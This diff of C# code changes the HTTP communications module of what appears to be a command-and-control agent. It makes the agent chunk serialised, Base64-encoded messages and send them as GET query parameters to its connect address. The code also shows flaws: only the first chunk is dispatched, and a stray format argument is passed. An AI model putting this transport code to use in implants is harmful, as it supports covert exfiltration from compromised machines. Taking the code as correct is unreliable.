@@ -3,7 +3,6 @@ using Agent.Interfaces;
 using Agent.Models;
 
 using Shared.Models;
-using Shared.Utilities;
 
 using System;
 using System.Collections.Generic;
@@ -17,14 +16,17 @@ namespace Agent.Comms
     {
         ModuleStatus Status;
 
-        string AgentID;
-        string ConnectAddress;
-        int ConnectPort;
+        readonly string AgentID;
+        readonly string ConnectAddress;
+        readonly int ConnectPort;
+
+        const int MaxChunkSize = 2000;
 
         ConfigController Config;
 
         Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
         Queue<AgentMessage> Outbound = new Queue<AgentMessage>();
+        Queue<HTTPChunk> OutChunks = new Queue<HTTPChunk>();
 
         public HTTPCommModule(string AgentID, string ConnectAddress, int ConnectPort)
         {
@@ -94,11 +96,44 @@ namespace Agent.Comms
                 };
             }
 
-            var serialised = Shared.Utilities.Utilities.SerialiseData(message);
-            var uri = new Uri(string.Format("/?data={0}", Convert.ToBase64String(serialised)), UriKind.Relative);
+            var data = Convert.ToBase64String(Shared.Utilities.Utilities.SerialiseData(message));
+            var chunkID = Shared.Utilities.Utilities.GetRandomString(6);
 
-            var client = NewClient();
-            client.DownloadDataAsync(uri);
+            for (var i = 0; i <= data.Length; i += MaxChunkSize)
+            {
+                var chunk = new HTTPChunk
+                {
+                    AgentID = AgentID,
+                    ChunkID = chunkID
+                };
+
+                if (i + MaxChunkSize >= data.Length)
+                {
+                    chunk.Data = data.Substring(i, data.Length - i);
+                    chunk.Final = true;
+                }
+                else
+                {
+                    chunk.Data = data.Substring(i, MaxChunkSize);
+                    chunk.Final = false;
+                }
+
+                OutChunks.Enqueue(chunk);
+            }
+
+            if (OutChunks.Count > 0)
+            {
+                var nextChunk = OutChunks.Dequeue();
+
+                var x = string.Format("/?agentid={0}&chunkid={1}&data={2}&final={3}",
+                    nextChunk.AgentID, nextChunk.ChunkID, nextChunk.Data, nextChunk.Final,
+                    UriKind.Relative);
+
+                var uri = new Uri(x, UriKind.Relative);
+
+                var client = NewClient();
+                client.DownloadDataAsync(uri);
+            }
         }
 
         WebClient NewClient()
